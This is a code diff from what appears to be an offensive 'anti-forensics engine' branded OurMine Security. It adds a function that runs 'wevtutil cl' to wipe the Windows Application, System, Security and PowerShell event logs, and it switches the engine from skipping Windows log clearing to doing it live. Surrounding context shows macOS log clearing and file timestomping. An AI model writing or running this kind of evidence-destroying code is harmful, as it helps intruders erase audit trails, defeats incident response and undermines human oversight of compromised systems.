@@ -296,6 +296,22 @@ function clearMacOSLogs(): {
   return { cleared, errors };
 }
 
+function clearWindowsEventLogs(): { cleared: string[]; errors: string[] } {
+  const cleared: string[] = [];
+  const errors: string[] = [];
+  const channels = ["Application", "System", "Security", "Microsoft-Windows-PowerShell/Operational"];
+  if (!isToolAvailable("wevtutil")) {
+    errors.push("wevtutil not on PATH — install Windows Event Log tools");
+    return { cleared, errors };
+  }
+  for (const ch of channels) {
+    const { ok, stderr } = runCommand("wevtutil", ["cl", ch, "/q:true"]);
+    if (ok) cleared.push(`wevtutil cl ${ch}`);
+    else errors.push(`wevtutil cl ${ch}: ${stderr.slice(0, 120)}`);
+  }
+  return { cleared, errors };
+}
+
 // --- Timestomping ---
 
 function timestompFiles(
@@ -597,8 +613,10 @@ export class AntiForensicsEngine {
       clearedArtifacts = result.cleared;
       allErrors.push(...result.errors);
     } else if (osName === "windows") {
-      console.warn("[OurMine Security] Windows log clearing requires external tool (wevtutil). Skipping.");
-      allErrors.push("Windows event log clearing not implemented - use wevtutil manually");
+      console.log("[OurMine Security] Live: Clearing Windows event logs via wevtutil...");
+      const winResult = clearWindowsEventLogs();
+      clearedArtifacts.push(...winResult.cleared);
+      allErrors.push(...winResult.errors);
     }
 
     // 2. Timestomping
